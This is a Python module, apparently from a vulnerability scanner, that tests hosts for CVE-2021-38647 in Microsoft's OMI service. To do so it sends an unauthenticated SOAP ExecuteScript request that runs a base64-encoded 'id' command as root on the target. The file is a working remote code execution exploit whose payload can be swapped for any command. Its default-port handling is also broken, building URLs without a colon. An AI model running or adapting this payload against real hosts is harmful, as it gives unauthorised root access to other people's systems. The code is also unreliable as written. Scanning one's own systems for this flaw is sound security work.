import requests
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2021_38647(ip, ports=None, timeout=5):
    protocols = ["http", "https"]
    headers = {
        "User-Agent": user_agents(),
        "Content-Type": "application/soap+xml;charset=UTF-8"
    }

    data = f"""<s:Envelope
          xmlns:s="http://www.w3.org/2003/05/soap-envelope"
          xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
          xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
          xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema"
          xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
          xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
          <s:Header>
            <a:To>HTTP://{ip}/wsman/</a:To>
            <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
            <a:ReplyTo>
              <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
            </a:ReplyTo>
            <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>
            <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
            <a:MessageID>uuid:00B60932-CC01-0005-0000-000000010000</a:MessageID>
            <w:OperationTimeout>PT1M30S</w:OperationTimeout>
            <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
            <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
            <w:OptionSet s:mustUnderstand="true"/>
            <w:SelectorSet>
              <w:Selector Name="__cimnamespace">root/scx</w:Selector>
            </w:SelectorSet>
          </s:Header>
          <s:Body>
            <p:ExecuteScript_INPUT
              xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
              <p:Script>aWQ=</p:Script>
              <p:Arguments/>
              <p:timeout>0</p:timeout>
              <p:b64encoded>true</p:b64encoded>
            </p:ExecuteScript_INPUT>
          </s:Body>
        </s:Envelope>"""

    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for port in ports:
        for protocol in protocols:
            url = f"{protocol}://{ip}{port}/wsman"
            try:
                response = requests.post(url, headers=headers, data=data, verify=False, timeout=timeout)
                if "<p:StdOut>" in response.text and "uid=0(root) gid=0(root) groups=0" in response.text:
                    print_colour(f"The target is vulnerable to CVE-2021-38647: {url}")
                    return True
            except requests.RequestException:
                continue
    return False